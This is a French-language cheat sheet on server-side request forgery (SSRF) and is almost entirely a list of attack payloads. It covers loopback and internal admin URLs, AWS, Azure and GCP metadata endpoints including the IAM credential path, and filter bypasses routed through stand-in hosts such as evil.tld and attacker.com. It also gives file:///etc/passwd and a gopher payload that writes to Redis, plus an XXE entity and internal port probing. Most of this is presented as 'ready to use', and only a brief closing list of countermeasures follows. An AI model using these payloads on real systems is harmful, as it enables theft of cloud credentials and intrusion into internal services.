# SSRF Cheat Sheet

## Rappels essentiels

- **SSRF** : la webapp fait une requête côté serveur vers une destination non prévue, contrôlée par l’attaquant.  
- Impacts : accès internes/admin, lecture métadonnées cloud, actions latérales, parfois RCE.  

## Détection rapide

- Paramètres suspects : `url=`, `path=`, `dest=`, `next=`, `image=`, `feed=`, `callback=`, `stockApi=`
- Tester loopback :
  - `http://127.0.0.1/`
  - `http://localhost/`
  - `http://127.1/`
- Blind SSRF (domaine attaquant) :
  - `http://<your-collab-domain>/`

## Exploitation – Cibles classiques

### 1) Serveur local
- `http://127.0.0.1/admin`
- `http://localhost/admin`

### 2) Réseau interne
- `http://192.168.0.68/admin`
- `http://10.0.0.5:8080/`

### 3) Métadonnées Cloud
- AWS :
  - `http://169.254.169.254/latest/meta-data/`
  - `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Azure :
  - `http://169.254.169.254/metadata/instance?api-version=2021-01-01`
- GCP :
  - `http://metadata.google.internal/computeMetadata/v1/`

## Bypass filtres

### Blacklist
- IP alternatives :
  - `127.1`
  - `2130706433`
  - `017700000001`
- Obfuscations :
  - `http://127.0.0.1%2fadmin`
  - `http://127.0.0.1%252fadmin`
  - `http://127.0.0.1:80#@evil.com`
  - `http://spoofed.burpcollaborator.net/`

### Whitelist
- Userinfo :
  - `https://allowed.com@evil.tld`
- Fragment :
  - `https://evil.tld#allowed.com`
- Sous-domaine :
  - `https://allowed.com.evil.tld/`
- Encodages :
  - `https://allowed.com%2f%2e%2e%2f127.0.0.1/`
  - `https://127.0.0.1%252fadmin`

### Protocoles
- `ftp://127.0.0.1/`
- `file:///etc/passwd`
- `gopher://127.0.0.1:6379/_SET%20key%20value`

## Bypass via Open Redirect

- Exemple :
  - `https://victime.tld/redirect?next=http://127.0.0.1/admin`
    
## Blind SSRF

- Détection :
  - `http://<your-collab-domain>/`
- Cloud exfil :
  - `http://169.254.169.254/latest/meta-data/`

## Vecteurs alternatifs

- XXE → SSRF :
  `<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">`
- OAuth/OpenID : dynamic client registration vers IMDS.  
- Referer header :
  `Referer: http://attacker.com/malicious`

## Exemples prêts à l’emploi

- Localhost :
  - `http://127.0.0.1/admin`
  - `http://localhost/admin`
- Interne :
  - `http://192.168.0.68/admin`
  - `http://10.0.0.5:8080/`
- Bypass encodage :
  - `http://127.0.0.1%2fadmin`
  - `http://127.0.0.1%252fadmin`
- Whitelist contournée :
  - `https://allowed.com@127.0.0.1/admin`
  - `https://allowed.com.evil.tld/.%2e/127.0.0.1/`
- Open Redirect :
  - `https://victime.tld/redirect?next=http://127.0.0.1/admin`
- Cloud :
  - `http://169.254.169.254/latest/meta-data/`
  - `http://metadata.google.internal/computeMetadata/v1/`

## Découverte réseau via SSRF

- Selon différences de réponse/délai :
  - `http://10.0.0.5:22/`
  - `http://10.0.0.5:80/`
  - `http://10.0.0.5:443/`
    
## Contremesures
- Allow-list stricte + validation canonique.  
- Bloquer redirections et schémas non-HTTP.  
- Pas de relay brut des réponses internes.  
- Sécuriser IMDS (IMDSv2, hop limit).  

